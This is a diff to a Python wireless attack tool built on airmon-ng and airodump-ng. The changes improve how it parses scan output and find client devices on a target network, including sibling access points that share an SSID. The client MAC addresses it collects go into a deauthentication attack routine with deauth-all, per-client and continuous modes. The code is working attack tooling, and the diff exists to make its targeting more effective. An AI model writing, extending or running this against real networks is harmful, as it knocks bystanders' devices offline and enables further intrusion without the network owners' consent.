@@ -15,7 +15,7 @@ import tempfile
 import time
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Dict, List, Optional, Tuple
+from typing import Dict, List, Optional, Set, Tuple
 
 # ── Colors ────────────────────────────────────────────────────────────────────
 R  = "\033[91m"
@@ -263,6 +263,9 @@ def stop_monitor(mon_iface: str, original_iface: str):
             run_cmd(["airmon-ng", "stop", name], timeout=15)
 
 
+MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")
+
+
 def parse_airodump_csv(prefix: str) -> Tuple[Dict[str, Network], Dict[str, List[Client]]]:
     """Parse airodump-ng CSV output."""
     networks: Dict[str, Network] = {}
@@ -273,48 +276,64 @@ def parse_airodump_csv(prefix: str) -> Tuple[Dict[str, Network], Dict[str, List[
         return networks, clients_by_bssid
 
     with open(ap_file, "r", encoding="utf-8", errors="replace") as f:
-        content = f.read()
+        content = f.read().replace("\r\n", "\n")
 
-    sections = content.split("\n\n")
-    for section in sections:
-        lines = [l for l in section.strip().splitlines() if l.strip()]
-        if not lines:
-            continue
+    # Split AP vs station sections reliably
+    station_idx = content.find("Station MAC")
+    if station_idx == -1:
+        ap_part = content
+        station_part = ""
+    else:
+        ap_part = content[:station_idx]
+        station_part = content[station_idx:]
 
-        header = lines[0]
-        if "BSSID" in header and "ESSID" in header:
-            for row in csv.reader(lines[1:]):
-                if len(row) < 14:
-                    continue
-                bssid = row[0].strip()
-                if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
-                    continue
-                net = Network(
-                    bssid=bssid,
-                    channel=row[3].strip(),
-                    power=row[8].strip(),
-                    encryption=row[5].strip(),
-                    essid=row[13].strip(),
-                )
-                networks[bssid] = net
+    ap_lines = [l for l in ap_part.strip().splitlines() if l.strip()]
+    if ap_lines:
+        for row in csv.reader(ap_lines[1:]):
+            if len(row) < 14:
+                continue
+            bssid = row[0].strip()
+            if not MAC_RE.match(bssid):
+                continue
+            networks[bssid] = Network(
+                bssid=bssid,
+                channel=row[3].strip(),
+                power=row[8].strip(),
+                encryption=row[5].strip(),
+                essid=row[13].strip(),
+            )
 
-        elif "Station MAC" in header and "BSSID" in header:
-            for row in csv.reader(lines[1:]):
-                if len(row) < 6:
-                    continue
-                client_mac = row[0].strip()
+    station_lines = [l for l in station_part.strip().splitlines() if l.strip()]
+    if station_lines:
+        for row in csv.reader(station_lines[1:]):
+            if len(row) < 2:
+                continue
+            client_mac = row[0].strip()
+            if not MAC_RE.match(client_mac):
+                continue
+
+            bssid = ""
+            if len(row) > 5 and MAC_RE.match(row[5].strip()):
                 bssid = row[5].strip()
-                if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", client_mac):
-                    continue
-                if bssid == "(not associated)" or not bssid:
-                    continue
-                client = Client(
-                    mac=client_mac,
-                    power=row[3].strip() if len(row) > 3 else "",
-                    packets=row[4].strip() if len(row) > 4 else "",
-                    bssid=bssid,
-                )
-                clients_by_bssid.setdefault(bssid, []).append(client)
+            else:
+                for cell in row[1:]:
+                    cell = cell.strip()
+                    if MAC_RE.match(cell):
+                        bssid = cell
+                        break
+
+            if not bssid or bssid == "(not associated)":
+                continue
+
+            client = Client(
+                mac=client_mac,
+                power=row[3].strip() if len(row) > 3 else "",
+                packets=row[4].strip() if len(row) > 4 else "",
+                bssid=bssid,
+            )
+            bucket = clients_by_bssid.setdefault(bssid, [])
+            if not any(c.mac == client_mac for c in bucket):
+                bucket.append(client)
 
     for bssid, clients in clients_by_bssid.items():
         if bssid in networks:
@@ -323,11 +342,42 @@ def parse_airodump_csv(prefix: str) -> Tuple[Dict[str, Network], Dict[str, List[
     return networks, clients_by_bssid
 
 
+def collect_clients_for_target(
+    clients_by_bssid: Dict[str, List[Client]],
+    networks: Dict[str, Network],
+    target: Network,
+) -> List[Client]:
+    """Match clients by BSSID and by same ESSID (multi-AP / mesh networks)."""
+    seen: Set[str] = set()
+    result: List[Client] = []
+    essid = target.essid.strip()
+    target_ch = normalize_channel(target.channel)
+
+    def add_client(c: Client):
+        if c.mac not in seen:
+            seen.add(c.mac)
+            result.append(c)
+
+    for c in clients_by_bssid.get(target.bssid, []):
+        add_client(c)
+
+    if essid:
+        for bssid, clients in clients_by_bssid.items():
+            net = networks.get(bssid)
+            if not net or net.essid.strip() != essid:
+                continue
+            if target_ch and normalize_channel(net.channel) != target_ch:
+                continue
+            for c in clients:
+                add_client(c)
+
+    return result
+
+
 def scan_networks(
     mon_iface: str,
     duration: int = 30,
     channel: Optional[str] = None,
-    bssid: Optional[str] = None,
     quiet_header: bool = False,
 ) -> Dict[str, Network]:
     """Scan nearby WiFi networks and connected clients."""
@@ -338,8 +388,6 @@ def scan_networks(
         print(f"\n{C}Scanning wireless networks ({duration}s)...{RS}")
         if channel:
             print(f"{GR}Locked to channel {channel}{RS}")
-        if bssid:
-            print(f"{GR}Filtering BSSID {bssid}{RS}")
         print(f"{GR}Includes routers, WiFi APs, and phone hotspots/tethering{RS}\n")
 
     ch = normalize_channel(channel or "")
@@ -348,12 +396,11 @@ def scan_networks(
 
     cmd = [
         "airodump-ng", "--band", "abg", "--output-format", "csv",
-        "--write-interval", "1", "-w", prefix,
+        "--write-interval", "1", "--ignore-negative-one", "-w", prefix,
     ]
     if ch:
         cmd.extend(["-c", ch])
-    if bssid:
-        cmd.extend(["--bssid", bssid])
+    # Do not use --bssid here: it hides clients on sibling APs with the same SSID
     cmd.append(mon_iface)
 
     proc = subprocess.Popen(
@@ -363,10 +410,21 @@ def scan_networks(
     )
 
     label = f"ch{ch}" if ch else "all channels"
+    best_clients: Dict[str, List[Client]] = {}
+    best_networks: Dict[str, Network] = {}
+
     for i in range(duration):
         remaining = duration - i
         print(f"\r  {GR}Scanning {label} on {mon_iface}... {remaining:2d}s remaining{RS}", end="", flush=True)
         time.sleep(1)
+        if i > 0 and i % 5 == 0:
+            nets, cbs = parse_airodump_csv(prefix)
+            best_networks.update(nets)
+            for bk, clist in cbs.items():
+                existing = best_clients.setdefault(bk, [])
+                for c in clist:
+                    if not any(x.mac == c.mac for x in existing):
+                        existing.append(c)
 
     proc.send_signal(signal.SIGINT)
     try:
@@ -385,14 +443,19 @@ def scan_networks(
         print(f"\r  {G}Scan complete!{RS}                         ")
 
     networks, clients_by_bssid = parse_airodump_csv(prefix)
+    best_networks.update(networks)
+    for bk, clist in clients_by_bssid.items():
+        existing = best_clients.setdefault(bk, [])
+        for c in clist:
+            if not any(x.mac == c.mac for x in existing):
+                existing.append(c)
+
+    networks = best_networks
+    clients_by_bssid = best_clients
 
     for bssid_key, clients in clients_by_bssid.items():
         if bssid_key in networks:
             networks[bssid_key].clients = clients
-        elif bssid and bssid_key == bssid:
-            networks[bssid_key] = Network(
-                bssid=bssid_key, channel=ch or "", power="", encryption="", essid="", clients=clients,
-            )
 
     if not networks and not quiet_header:
         if scan_err:
@@ -411,24 +474,36 @@ def scan_networks(
 
 def discover_clients(
     mon_iface: str,
-    bssid: str,
-    channel: str,
-    duration: int = 25,
+    target: Network,
+    duration: int = 40,
+    known_networks: Optional[Dict[str, Network]] = None,
 ) -> List[Client]:
-    """Channel-locked scan to find clients on a specific AP."""
-    print(f"\n{C}Discovering clients on channel {channel} ({duration}s)...{RS}")
+    """Channel-locked scan to find clients (matches same SSID across multiple APs)."""
+    ch = normalize_channel(target.channel) or target.channel
+    print(f"\n{C}Discovering clients on channel {ch} ({duration}s)...{RS}")
+    print(f"{GR}  Matching SSID: {target.display_name} (all APs on this channel){RS}")
+
     networks = scan_networks(
         mon_iface,
         duration=duration,
-        channel=channel,
-        bssid=bssid,
+        channel=ch or target.channel,
         quiet_header=True,
     )
-    if bssid in networks:
-        found = networks[bssid].clients
+    if known_networks:
+        networks.update(known_networks)
+
+    found = collect_clients_for_target(
+        {b: n.clients for b, n in networks.items() if n.clients},
+        networks,
+        target,
+    )
+
+    print()
+    if found:
+        print(f"  {G}Found {len(found)} client(s){RS}")
     else:
-        found = []
-    print(f"  {G}Found {len(found)} client(s){RS}")
+        print(f"  {Y}Found 0 client(s) — keep devices active on WiFi, then use option 5{RS}")
+        print(f"{GR}  Tip: enterprise SSIDs use multiple APs; same-name clients may be on a sibling BSSID{RS}")
     return found
 
 
@@ -626,7 +701,7 @@ def interactive_mode(mon_iface: str):
 
         warn_encryption(target)
         target.clients = discover_clients(
-            mon_iface, target.bssid, target.channel, duration=25,
+            mon_iface, target, duration=40, known_networks=networks,
         )
         display_clients(target)
 
@@ -646,7 +721,7 @@ def interactive_mode(mon_iface: str):
             continue
         elif opt == "5":
             target.clients = discover_clients(
-                mon_iface, target.bssid, target.channel, duration=30,
+                mon_iface, target, duration=45, known_networks=networks,
             )
             display_clients(target)
             continue
@@ -828,13 +903,18 @@ Examples:
         if args.bssid and (args.deauth_all or args.client or args.continuous):
             count = 0 if args.continuous else args.deauth_count
             ch = args.channel
+            nets: Dict[str, Network] = {}
             if not ch:
-                nets = scan_networks(mon_iface, duration=10, bssid=args.bssid)
+                nets = scan_networks(mon_iface, duration=15)
                 if args.bssid in nets:
                     ch = nets[args.bssid].channel
+            stub = nets.get(
+                args.bssid,
+                Network(bssid=args.bssid, channel=ch or "", power="", encryption="", essid="", clients=[]),
+            )
             clients = []
-            if args.bssid and ch:
-                clients = [c.mac for c in discover_clients(mon_iface, args.bssid, ch, 20)]
+            if ch:
+                clients = [c.mac for c in discover_clients(mon_iface, stub, 30, nets)]
             deauth_attack(
                 mon_iface,
                 args.bssid,
@@ -846,7 +926,7 @@ Examples:
             )
         elif args.bssid:
             networks = scan_networks(
-                mon_iface, args.scan, channel=args.channel, bssid=args.bssid,
+                mon_iface, args.scan, channel=args.channel,
             )
             if args.bssid in networks:
                 display_clients(networks[args.bssid])
